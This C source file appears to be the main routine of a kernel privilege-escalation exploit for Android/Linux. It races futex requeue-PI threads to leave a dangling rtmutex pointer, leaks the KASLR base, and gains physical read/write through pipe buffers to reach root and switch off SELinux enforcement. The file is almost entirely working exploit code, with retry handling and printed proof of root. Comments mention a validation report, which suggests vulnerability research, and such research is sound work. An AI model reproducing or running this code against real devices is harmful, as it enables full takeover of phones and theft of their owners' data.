#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

#ifdef MCAST_WAITER_OFF
  do_mcast_fake_lock_route();
#else
  do_pselect_fake_lock_route();
#endif
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

/* Адаптивное ожидание вместо чистого yield-спина: первые итерации греют
 * кэш (важно для тайминга), дальше поток засыпает — ядро не жжётся на 100%. */
static inline void spin_wait_adaptive(int iter) {
  if (iter < 200) {
    for (int i = 0; i < 64; i++) {
      __asm__ volatile("yield" ::: "memory");
    }
  } else {
    struct timespec ts = {.tv_sec = 0, .tv_nsec = 200000}; /* 0.2 ms */
    nanosleep(&ts, NULL);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  int idle_iters = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      spin_wait_adaptive(idle_iters++);
      continue;
    }
    idle_iters = 0;

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice =
          env_int_range("NEO11_PUNCH_NICE", PSELECT_CONSUMER_NICE, -20, 19);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec,
               env_int_range("NEO11_ENTER_DELAY_USEC", PSELECT_ENTER_DELAY_USEC,
                             0, 10000000));
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  /* The requeue fails with -EDEADLK: the waiter forms a PI cycle
   * (waiter holds f_pi_chain <- owner holds f_pi_target <- waiter). The
   * rtmutex rollback (remove_waiter, kernel/locking/rtmutex.c) dequeues the
   * waiter but clears current's pi_blocked_on instead of the waiter's, so the
   * sleeping waiter keeps a dangling pi_blocked_on into its own kernel stack
   * frame. Wake it now: handle_early_requeue_pi_wakeup() (kernel/futex/
   * requeue.c) unqueues it without touching pi_blocked_on, so the dangling
   * pointer survives and the waiter runs the pselect route immediately
   * instead of sleeping ROUTE_WAIT_SECONDS. */
  errno = 0;
  futex_op(&f_wait, FUTEX_WAKE, 1, NULL, NULL, 0);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  /* Закрепить stdout на высоко fd до всех fork/dup2: app читает логи
   * именно из унаследованного stdout, а slide/fops dup2-подготовка
   * перекрывает 0..NFDS-1 целиком. */
  rmv_log_fd = fcntl(STDOUT_FILENO, F_DUPFD_CLOEXEC, 512);
  log_startup_context();

  /* init_ashmem_path() читает /proc/sys/kernel/random/boot_id, чтобы собрать
   * "/dev/ashmem<uuid>". ЧИТАТЬ boot_id ДО слайда нельзя: первое чтение
   * генерирует UUID в sysctl boot_id-буфере, и rb-обход висячего waiter'а
   * начинает разыменовывать случайные байты UUID как узлы дерева -> слайд
   * гарантированно миссуется на каждой попытке. Отлагаем до slide. */

  pin_to_core(CORE);
  /* KASLR base: 直接用 slide 泄漏（perf 采样在本机上会给出错误 base 导致
   * 后续 canon 地址全错而 panic，已实测）。 */
  if (!slide_leak_kernel_base()) {
    pr_error("kaslr leak failed\n");
    return 1;
  }
  init_ashmem_path();

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);

  /* Тишина перед PI-маршрутом: при высокой системной нагрузке тайминги
   * рвутся и waiter попадает в чужой фрейм → panic. Покой меряем по
   * busy-fraction из /proc/stat (доступен shell-домену; loadavg на vivo
   * врёт — RSC-счётчик держит 500+ десятки минут; /proc/pressure/* —
   * EACCES без рута). Ждём busy<0.6 максимум 30 с: реальный boot-шторм
   * задач оседает за это время. */
  {
    double busy = safety_cpu_busy();
    if (busy >= 0) {
      pr_info("quiesce: cpu_busy=%.2f (loadavg=%.2f diag-only)\n",
              busy, safety_loadavg());
      safety_quiesce(0.6, 30);
    }
  }

  run_main_route_threads();

  /* Неудача маршрута/CFI — код возврата не 0, preload повторит с паузой. */
  if (!atomic_load(&cfi_stage_done) || !root_child_done) {
    pr_error("rmv core failed: cfi_done=%d root=%d — returning failure for retry\n",
             atomic_load(&cfi_stage_done), root_child_done);
    return 1;
  }

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }

  /* Post-root kernel-state enhancements (panic suppression, sysctl opens, and
   * the NEO11_*-gated experiments). Runs in a forked child so a fault only
   * kills it, never this process or the io daemon fork. */
  /* Доказательство рута для отчёта валидации (proof.c): печатается
   * только после подтверждённого uid==0 в root-стадии. */
  rmv_emit_proof();

  posture_apply();

  sleep(5);
  return 0;
}
